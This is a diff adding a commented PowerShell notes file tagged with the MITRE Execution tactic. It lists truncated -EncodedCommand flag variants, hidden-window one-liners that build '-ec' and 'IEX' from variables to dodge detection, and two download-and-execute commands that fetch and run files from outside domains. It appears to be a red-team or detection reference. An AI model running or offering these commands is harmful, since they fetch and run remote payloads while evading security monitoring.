@@ -1,0 +1,33 @@
+# MITRE PHASE: EXECUTION
+# MITRE TECHNIQUE: Powershell
+
+# ref: https://www.trustedsec.com/blog/circumventing-encodedcommand-detection-powershell/
+# variations of encodedcommand that works
+#-e
+#-ec
+#-en
+#-enc
+#-enco
+#-encod
+#-encode
+#-encoded
+#-encodedc
+#-encodedco
+#-encodedcom
+#-encodedcomm
+#-encodedcomma
+#-encodedcomman
+#-encodedcommand
+
+#https://github.com/danielbohannon/Invoke-Obfuscation
+
+#powershell -window hidden -C "set-variable -name "LB" -value "-"; set-variable -name "I" -value "e"; set-variable -name "V" -value "c"; set-variable -name "wP" -value ((get-variable LB).value.toString()+(get-variable I).value.toString()+(get-variable V).value.toString()) ; powershell (get-variable wP).value.toString() <base64_string>
+
+#powershell -window hidden -C "sv x -;sv y ec;sv Z ((gv x).value.toString()+(gv y).value.toString());powershell (gv Z).value.toString()"
+
+#powershell -window hidden -C "set-variable -name "LB" -value "I"; set-variable -name "I" -value "E"; set-variable -name "V" -value "X"; set-variable -name "wP" -value ((get-variable LB).value.toString()+(get-variable I).value.toString()+(get-variable V).value.toString()) ; powershell (get-variable wP).value.toString() ('<YOURINVOKEEXPRESSIONSTUFFHERE>')"
+
+#“c:\windows\system32\windowspowershell\v1.0\powershell.exe” -windowstyle hidden $d=$env:temp+[char][byte]92+’1478810889388.js’;(new-object system.net.webclient).downloadfile(‘http’+’s://rivevetoood.org/4421148251951/1478810791469497/flashplayer.jse’,$d);invoke-item $d;
+
+
+#PowerShell (New-Object System.Net.WebClient).DownloadFile(‘http://www.sungkrorsang.com/dolsifcaplomcs.png’,’C:\Users\XXXXXXXX\AppData\Local\Temp\Sxbyt.exe’);Start-Process ‘C:\Users\XXXXXXXX\AppData\Local\Temp\Sxbyt.exe’;
